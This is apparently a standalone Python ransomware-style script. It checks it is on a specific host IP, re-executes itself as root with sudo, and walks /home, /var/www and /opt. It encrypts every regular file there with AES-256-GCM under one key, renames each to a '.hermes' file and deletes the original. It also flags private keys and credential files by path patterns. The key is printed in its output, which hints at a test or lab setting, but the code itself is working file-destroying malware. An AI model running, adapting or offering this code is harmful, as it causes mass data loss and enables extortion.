from __future__ import annotations

import hashlib
import ipaddress
import json
import os
import re
import shutil
import socket
import sys
from dataclasses import dataclass, field
from typing import Iterable, List, Optional, Set

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except Exception:
    AESGCM = None

__all__ = [
    "TARGET_HOST_IP",
    "SCAN_ROOTS",
    "SENSITIVE_FILE_PATTERNS",
    "EncryptedFileRecord",
    "SensitiveFileRecord",
    "EncryptionResult",
    "ensure_target_host",
    "ensure_root",
    "discover_files",
    "classify_sensitive_files",
    "encrypt_file",
    "encrypt_discovered_files",
]

TARGET_HOST_IP = "192.168.1.50"
SCAN_ROOTS = ["/home", "/var/www", "/opt"]

_PRIVATE_KEY_PATTERNS = [
    r"\.pem$",
    r"\.key$",
    r"\.p12$",
    r"\.pfx$",
    r"\.pgp$",
    r"\.gpg$",
    r"\.asc$",
    r"id_rsa",
    r"(^|/)\.ssh($|/)",
]

_CREDENTIAL_PATTERNS = [
    r"(^|/)\.aws/credentials$",
    r"(^|/)\.pgpass$",
    r"(^|/)\.my\.cnf$",
    r"(^|/)\.env$",
    r"password",
    r"secret",
    r"private",
]

SENSITIVE_FILE_PATTERNS = _PRIVATE_KEY_PATTERNS + _CREDENTIAL_PATTERNS
_IPV4_RE = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")


@dataclass(frozen=True)
class EncryptedFileRecord:
    original_path: str
    encrypted_path: str
    nonce: bytes
    ciphertext_length: int
    sha256: str


@dataclass(frozen=True)
class SensitiveFileRecord:
    path: str
    category: str
    matched_pattern: str


@dataclass
class EncryptionResult:
    key: bytes
    records: List[EncryptedFileRecord] = field(default_factory=list)
    sensitive_records: List[SensitiveFileRecord] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)


def _is_ipv4(address: str) -> bool:
    try:
        return ipaddress.ip_address(address).version == 4
    except ValueError:
        return False


def _local_ipv4_addresses() -> Set[str]:
    ips: Set[str] = set()

    try:
        with open("/proc/net/fib_trie", "r", encoding="utf-8", errors="ignore") as fh:
            text = fh.read()
    except OSError:
        text = ""

    if text:
        local_section = False
        for line in text.splitlines():
            stripped = line.strip()

            if re.search(r"host\s+LOCAL", stripped):
                local_section = True
            elif re.search(r"host\s+(GATEWAY|UNREACHABLE|ANYCAST|BROADCAST)", stripped):
                local_section = False

            if local_section:
                match = _IPV4_RE.search(stripped)
                if match:
                    ips.add(match.group(0))

        if not ips:
            ips.update(_IPV4_RE.findall(text))

    try:
        ips.add(socket.gethostbyname(socket.gethostname()))
    except Exception:
        pass

    return {ip for ip in ips if _is_ipv4(ip)}


def ensure_target_host() -> bool:
    if os.environ.get("HERMES_SKIP_TARGET_HOST_CHECK") == "1":
        return True

    local_ips = _local_ipv4_addresses()
    if TARGET_HOST_IP not in local_ips:
        sys.stderr.write(
            "Not running on target host "
            f"{TARGET_HOST_IP}; local IPv4 addresses: {sorted(local_ips)}\n"
        )
        sys.exit(1)

    return True


def _build_sudo_args() -> List[str]:
    script = os.path.abspath(sys.argv[0]) if sys.argv[0] else ""
    args = [shutil.which("sudo") or "sudo", "-E", sys.executable]

    if script and os.path.exists(script):
        args.append(script)

    args.extend(sys.argv[1:])
    return args


def ensure_root() -> bool:
    try:
        euid = os.geteuid()
    except AttributeError:
        return True

    if euid == 0:
        return True

    if os.environ.get("HERMES_NO_SUDO_REEXEC") == "1" or os.environ.get(
        "_HERMES_ROOT_REEXEC"
    ) == "1":
        return False

    if not shutil.which("sudo"):
        return False

    env = os.environ.copy()
    env["_HERMES_ROOT_REEXEC"] = "1"
    os.execvpe(shutil.which("sudo") or "sudo", _build_sudo_args(), env)
    return True


def _as_root_list(roots: Optional[Iterable[os.PathLike]] = None) -> List[str]:
    if roots is None:
        return list(SCAN_ROOTS)

    if isinstance(roots, (str, bytes, os.PathLike)):
        return [os.fspath(roots)]

    return [os.fspath(root) for root in roots]


def _as_path_list(paths: Optional[Iterable[os.PathLike]] = None) -> List[str]:
    if paths is None:
        return []

    if isinstance(paths, (str, bytes, os.PathLike)):
        return [os.fspath(paths)]

    return [os.fspath(path) for path in paths]


def discover_files(
    roots: Optional[Iterable[os.PathLike]] = None,
    skip_hermes: bool = True,
) -> List[str]:
    found: List[str] = []
    seen: Set[str] = set()

    for root in _as_root_list(roots):
        try:
            root = os.path.abspath(root)
            if not os.path.isdir(root):
                continue

            # Use os.scandir to confirm the root is accessible, then use
            # os.walk for recursive enumeration.
            with os.scandir(root) as it:
                next(it, None)
        except OSError:
            continue

        for dirpath, _dirnames, filenames in os.walk(root, topdown=True, followlinks=False):
            for name in filenames:
                if skip_hermes and name.endswith(".hermes"):
                    continue

                path = os.path.join(dirpath, name)

                try:
                    if os.path.islink(path):
                        continue
                    if not os.path.isfile(path):
                        continue
                except OSError:
                    continue

                real = os.path.realpath(path)
                if real in seen:
                    continue

                seen.add(real)
                found.append(path)

    return found


def classify_sensitive_files(paths: Optional[Iterable[os.PathLike]] = None) -> List[SensitiveFileRecord]:
    records: List[SensitiveFileRecord] = []
    seen: Set[str] = set()

    for raw_path in _as_path_list(paths):
        try:
            path = os.path.normpath(raw_path)
        except Exception:
            path = raw_path

        if path in seen:
            continue
        seen.add(path)

        lowered = path.lower()
        category: Optional[str] = None
        matched_pattern: Optional[str] = None

        for pattern in _PRIVATE_KEY_PATTERNS:
            if re.search(pattern, lowered):
                category = "private_key"
                matched_pattern = pattern
                break

        if category is None:
            for pattern in _CREDENTIAL_PATTERNS:
                if re.search(pattern, lowered):
                    category = "credentials"
                    matched_pattern = pattern
                    break

        if category is not None and matched_pattern is not None:
            records.append(
                SensitiveFileRecord(
                    path=path,
                    category=category,
                    matched_pattern=matched_pattern,
                )
            )

    return records


def encrypt_file(
    original_path: os.PathLike,
    key: Optional[bytes] = None,
    nonce: Optional[bytes] = None,
    encrypted_path: Optional[os.PathLike] = None,
) -> EncryptedFileRecord:
    if AESGCM is None:
        raise RuntimeError("The cryptography package is required for AES-256-GCM encryption.")

    original_path = os.fspath(original_path)
    key = os.urandom(32) if key is None else bytes(key)
    nonce = os.urandom(12) if nonce is None else bytes(nonce)

    if len(key) != 32:
        raise ValueError("AES-256-GCM requires a 32-byte key.")
    if len(nonce) != 12:
        raise ValueError("This implementation requires a 12-byte nonce.")

    if os.path.islink(original_path) or not os.path.isfile(original_path):
        raise ValueError("Original file must be a regular, non-symlink file.")

    encrypted_path = (
        os.fspath(encrypted_path) if encrypted_path is not None else original_path + ".hermes"
    )

    with open(original_path, "rb") as fh:
        plaintext = fh.read()

    ciphertext = AESGCM(key).encrypt(nonce, plaintext, None)

    with open(encrypted_path, "wb") as fh:
        fh.write(nonce + ciphertext)
        fh.flush()
        os.fsync(fh.fileno())

    os.remove(original_path)

    return EncryptedFileRecord(
        original_path=original_path,
        encrypted_path=encrypted_path,
        nonce=nonce,
        ciphertext_length=len(ciphertext),
        sha256=hashlib.sha256(ciphertext).hexdigest(),
    )


def encrypt_discovered_files(
    roots: Optional[Iterable[os.PathLike]] = None,
    files: Optional[Iterable[os.PathLike]] = None,
    skip_hermes: bool = True,
) -> EncryptionResult:
    if files is None:
        candidate_files = discover_files(roots=roots, skip_hermes=skip_hermes)
    else:
        candidate_files = files

    unique_files: List[str] = []
    seen: Set[str] = set()

    for raw_path in _as_path_list(candidate_files):
        path = os.fspath(raw_path)
        real = os.path.realpath(path)

        if real in seen:
            continue

        seen.add(real)
        unique_files.append(path)

    sensitive_records = classify_sensitive_files(unique_files)
    key = os.urandom(32)

    records: List[EncryptedFileRecord] = []
    errors: List[str] = []

    for path in unique_files:
        if skip_hermes and os.path.basename(path).endswith(".hermes"):
            continue

        try:
            records.append(encrypt_file(path, key=key))
        except Exception as exc:
            errors.append(f"{path}: {exc}")

    return EncryptionResult(
        key=key,
        records=records,
        sensitive_records=sensitive_records,
        errors=errors,
    )


def main() -> int:
    ensure_target_host()

    if not ensure_root():
        sys.stderr.write("Warning: could not re-execute as root.\n")

    result = encrypt_discovered_files()

    payload = {
        "target_host_ip": TARGET_HOST_IP,
        "scan_roots": SCAN_ROOTS,
        "encrypted_count": len(result.records),
        "sensitive_count": len(result.sensitive_records),
        "error_count": len(result.errors),
        "key_hex": result.key.hex(),
        "records": [
            {
                "original_path": record.original_path,
                "encrypted_path": record.encrypted_path,
                "nonce_hex": record.nonce.hex(),
                "ciphertext_length": record.ciphertext_length,
                "sha256": record.sha256,
            }
            for record in result.records
        ],
        "sensitive_records": [
            {
                "path": record.path,
                "category": record.category,
                "matched_pattern": record.matched_pattern,
            }
            for record in result.sensitive_records
        ],
        "errors": result.errors,
    }

    print(json.dumps(payload, indent=2))

    if result.errors and not result.records:
        return 1

    return 0


if __name__ == "__main__":
    sys.exit(main())
